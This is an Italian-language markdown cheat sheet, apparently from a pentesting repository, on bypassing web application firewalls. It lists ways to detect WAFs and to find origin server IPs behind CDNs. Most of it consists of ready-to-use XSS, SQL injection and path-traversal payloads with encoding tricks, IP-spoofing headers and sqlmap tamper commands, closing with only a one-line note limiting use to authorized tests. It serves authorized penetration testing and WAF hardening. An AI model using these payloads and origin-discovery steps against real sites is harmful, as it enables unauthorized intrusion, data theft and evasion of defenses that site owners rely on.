# 🛡️ Scheda di riferimento sull’aggiramento dei WAF

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Aggiramento dei Web Application Firewall
```

> **Nota sugli esempi:** le tecniche dipendono dal parser e dalla configurazione: non garantiscono un aggiramento. La sequenza indicata come UTF-8 usa codifiche sovralunghe non valide nei decoder UTF-8 conformi. Il primo hash della favicon è MD5, mentre la ricerca Shodan mostrata usa il valore MurmurHash3 calcolato dal secondo esempio. Un IP storico, fuori da intervalli cloud o trovato in un certificato non dimostra da solo che sia l’origine attuale. Percorsi e campi di ricerca possono dipendere dalla versione. Vedi [RFC 3629](https://www.rfc-editor.org/info/rfc3629/) e l’[approfondimento ufficiale Shodan sulle favicon](https://blog.shodan.io/deep-dive-http-favicon/).

---

## 🎯 Che cos’è l’aggiramento di un WAF

Le tecniche di **WAF bypass** consentono ai penetration tester di aggirare i Web Application Firewall e raggiungere il server di origine o inviare payload.

### WAF comuni
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

## 🔍 Individuazione dei WAF

### wafw00f
```bash
# Individua il WAF
wafw00f https://target.com

# Output dettagliato
wafw00f https://target.com -v

# Verifica tutti i WAF
wafw00f https://target.com -a
```

### Individuazione manuale
```bash
# Esamina gli header della risposta
curl -I https://target.com

# Cerca:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

## 🌐 Individuazione dell’IP di origine

### Storico DNS
```bash
# Servizi da consultare:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

### Ricerca nei certificati SSL
```bash
# Cerca certificati su Censys.io
# Cerca target.com nel certificato

# crt.sh - Certificate Transparency (trasparenza dei certificati)
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys CLI
censys search "parsed.names: target.com"
```

### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan: ricerca tramite hash del certificato SSL
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Ricerca: services.tls.certificates.leaf_data.subject.common_name: target.com
```

### Header delle email
```bash
# Iscriviti a una newsletter o a una notifica
# Cerca l’IP di origine negli header dell’email

# Cerca:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

### Sottodomini senza CDN
```bash
# Individua i sottodomini
subfinder -d target.com -o subs.txt

# Verifica quali sono dietro una CDN
cat subs.txt | httpx -ip

# Cerca:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

### Hash della favicon
```bash
# Calcola l’hash della favicon
curl -s https://target.com/favicon.ico | md5sum

# Cerca su Shodan tramite l’hash della favicon
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Ricerca Shodan
shodan search "http.favicon.hash:HASH_VALUE"
```

### Aggiramento tramite IPv6
```bash
# Il WAF potrebbe non coprire IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

### Intervalli IP del cloud
```bash
# Scarica gli intervalli IP dei provider cloud
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# Un IP fuori dagli intervalli cloud può essere un candidato per l’origine
```

---

## 🔓 Aggiramento tramite codifica dei payload

### Codifica URL
```
# Codifica singola
<script> → %3Cscript%3E

# Codifica doppia
<script> → %253Cscript%253E

# Codifica mista
<script> → %3Cscr%69pt%3E
```

### Codifica Unicode
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Sequenze di escape Unicode
<script> → \u003cscript\u003e

# Entità HTML
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

### Variazione di maiuscole e minuscole
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

### Byte nulli
```
# Inserimento di un byte nullo
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

### Commenti
```sql
# Commenti SQL
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Commenti inline
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

### Alternative agli spazi
```sql
# Tabulazione, nuova riga, ritorno a capo
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Segno più
UNION+SELECT
1'+OR+1=1--
```

---

## 🔥 Aggiramenti specifici dei WAF

### Aggiramento dei filtri XSS
```html
# Esempio standard bloccato
<script>alert(1)</script>

# Varianti di aggiramento
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Senza parentesi
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Senza alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Aggiramento dei filtri SQLi
```sql
# Aggiramento con UNION
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Aggiramento tramite commenti
-- → #
-- → --+
-- → --%00
-- → /**/

# Aggiramento logico
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Commenti legati alla versione (MySQL)
/*!50000SELECT*/ → Eseguito solo se MySQL >= 5.0
```

### Aggiramento dei filtri di path traversal
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

## 🛠️ Tecniche HTTP

### Inquinamento dei parametri HTTP (HTTP Parameter Pollution)
```http
# Parametri duplicati
?id=1&id=2
?id=1&ID=2

# Inserimento di array
?id[]=1&id[]=2
?id=1&id=2&id=3
```

### Manipolazione del metodo HTTP
```bash
# Cambia il metodo
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# Header di sostituzione del metodo
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

### Manipolazione degli header
```http
# Header per simulare un indirizzo IP
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Ambiguità del Content-Type
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

### Codifica a blocchi (chunked)
```http
Transfer-Encoding: chunked

4
test
0
```

---

## 🛠️ Strumenti

| Strumento | Scopo |
|------|---------|
| **wafw00f** | Individuazione dei WAF |
| **CloudFlair** | Ricerca del server di origine dietro Cloudflare |
| **Bypass-Firewalls-by-DNS-History** | Ricerca nello storico DNS |
| **WhatWaf** | Individuazione e aggiramento dei WAF |
| **sqlmap --tamper** | Script di aggiramento per SQLi |

### Script tamper di sqlmap
```bash
# Usa gli script tamper
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Più script tamper
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

## 📊 Riferimento rapido

| Tecnica | Caso d’uso |
|-----------|----------|
| Storico DNS | Individuare l’IP di origine |
| Ricerca SSL | Cercare certificati su Censys/Shodan |
| Enumerazione dei sottodomini | Individuare sottodomini senza CDN |
| Codifica | Aggirare i filtri |
| Maiuscole e minuscole | Aggirare regole semplici |
| Commenti | Separare le parole chiave |

---

## 📚 Risorse

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [OWASP WAF Bypass](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ Aggira i WAF!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
